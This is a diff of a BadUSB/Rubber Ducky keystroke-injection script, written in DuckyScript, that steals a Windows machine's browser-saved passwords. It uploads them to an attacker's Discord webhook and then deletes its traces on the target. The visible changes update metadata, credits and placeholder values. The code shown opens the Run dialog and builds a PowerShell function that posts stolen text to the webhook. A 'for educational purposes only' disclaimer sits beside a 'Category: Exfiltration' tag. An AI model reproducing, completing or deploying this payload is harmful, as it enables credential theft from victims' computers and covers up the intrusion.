@@ -1,15 +1,18 @@
 REM Title:          Windows Browsers Saved Passwords to Discord 
-REM Description:    Grabs browser saved passwords, writes to a file, uploads it to Discord, then cleans up the file on the targets filesystem and exits. 
+REM Description:    Rubber Ducky/BadUSB script to grab saved passwords, write to a file and then upload to Discord. Cleans up the targets filesystem and exits.
 REM Author:         Tsali
-REM Props:          Hak5 Team
+REM Props:          Hak5 Team, Jakoby
 REM Version:        1.0
-REM Date:           2025/03/23
+REM Date:           2024/01/01
 REM Category:       Exfiltration
 REM Target:         Windows 10/11 (CMD + Powershell)
 REM Attackmodes:    HID
 REM Mandatory Info: Add your Discord Webhook URL in quotes with no spaces and with permission to post.
 REM Discord URL:    Example: https://discord.com/api/webhooks/12345124127864187264871264/whateverthisisitshouldberandombutheyimjustapanda
 REM Legal:          This script is for educational purposes only please do not use this for malicious purposes
+
+REM References: Jakoby's Discord Upload function
+REM https://github.com/I-Am-Jakoby/
 
 GUI r
 DELAY 1000
@@ -32,11 +35,11 @@ STRING    [string]$text
 ENTER
 STRING )
 ENTER
-STRING $hookurl = ''
+STRING $hookurl = '<DISCORDHOOK_URL>'
 ENTER
 STRING $Body = @{
 ENTER
-STRING  'username' = "Flipper0"
+STRING  'username' = "<FLIPPERZERO_USERNAME>"
 ENTER
 STRING  'content' = $text
 ENTER
